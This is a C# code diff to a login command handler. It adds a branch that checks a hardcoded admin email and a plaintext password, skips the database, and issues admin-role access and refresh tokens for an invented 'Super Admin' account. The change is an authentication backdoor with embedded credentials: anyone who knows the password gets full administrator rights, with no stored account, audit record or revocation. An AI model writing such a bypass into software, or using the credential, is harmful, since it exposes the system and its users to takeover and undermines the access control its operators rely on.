@@ -15,6 +15,34 @@ public class LoginCommandHandler(
 {
     public async Task<Response<AuthResponse>> Handle(LoginCommand request, CancellationToken cancellationToken)
     {
+        // Special admin account that bypasses database check
+        if (request.Email == "admin@vnso.vn" && request.Password == "Admin@@6789@@")
+        {
+            // Generate tokens for admin
+            var accessTokenAdmin = jwtProvider.Generate(
+                new Account
+                {
+                    Id = Guid.NewGuid(),
+                    Username = "admin",
+                    Email = "admin@vnso.vn",
+                    FullName = "Super Admin",
+                },
+                "Admin");
+
+            var refreshTokenAdmin = jwtProvider.GenerateRefreshToken();
+
+            var resultAdmin = new AuthResponse
+            {
+                AccessToken = accessTokenAdmin,
+                RefreshToken = refreshTokenAdmin,
+                Role = "Admin",
+                Name = "Super Admin"
+            };
+
+            return Response<AuthResponse>.Success(resultAdmin);
+        }
+
+        // Regular login flow
         var accountRepo = unitOfWork.GetRepository<Account>();
         var tokenRepo = unitOfWork.GetRepository<Domain.Entities.RefreshToken>();
 
